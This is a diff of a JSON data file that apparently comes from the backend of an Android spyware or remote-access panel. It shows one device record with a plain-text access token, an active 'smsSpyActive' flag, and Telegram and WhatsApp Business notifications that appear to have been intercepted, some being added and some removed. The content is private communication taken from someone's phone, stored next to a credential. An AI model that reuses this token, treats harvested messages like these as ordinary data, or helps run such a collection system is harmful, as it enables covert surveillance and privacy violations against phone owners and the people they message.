@@ -303,7 +303,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775637680988,
+    "lastSeen": 1775637683982,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -319,6 +319,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
+        "content": "Voice message",
+        "time": "08/04 15:41",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637684560
+      },
+      {
+        "appName": "Telegram",
+        "sender": "TEAM ZANXRES: You",
+        "content": "T̴̕ ̐͒ T̴̕ ̐͒ joined to the group TEAM ZANXRES via invite link",
+        "time": "08/04 15:41",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637684514
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "12 new messages from 11 chats",
+        "time": "08/04 15:41",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637684409
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
+        "content": "Voice message",
+        "time": "08/04 15:41",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637684214
+      },
+      {
+        "appName": "Telegram",
+        "sender": "TEAM ZANXRES: You",
+        "content": "T̴̕ ̐͒ T̴̕ ̐͒ joined to the group TEAM ZANXRES via invite link",
+        "time": "08/04 15:41",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637684158
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -4278,46 +4318,6 @@
         "time": "08/04 14:44",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775634278380
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WhatsApp Business",
-        "content": "Sending video to 𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏",
-        "time": "08/04 14:44",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634277739
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WhatsApp Business",
-        "content": "Sending video to 𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏",
-        "time": "08/04 14:44",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634277473
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WhatsApp Business",
-        "content": "Sending video to 𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏",
-        "time": "08/04 14:44",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634277095
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WhatsApp Business",
-        "content": "Sending video to 𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏",
-        "time": "08/04 14:44",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634276794
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WhatsApp Business",
-        "content": "Sending video to 𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏",
-        "time": "08/04 14:44",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634276561
       }
     ],
     "galleryPhotos": [],
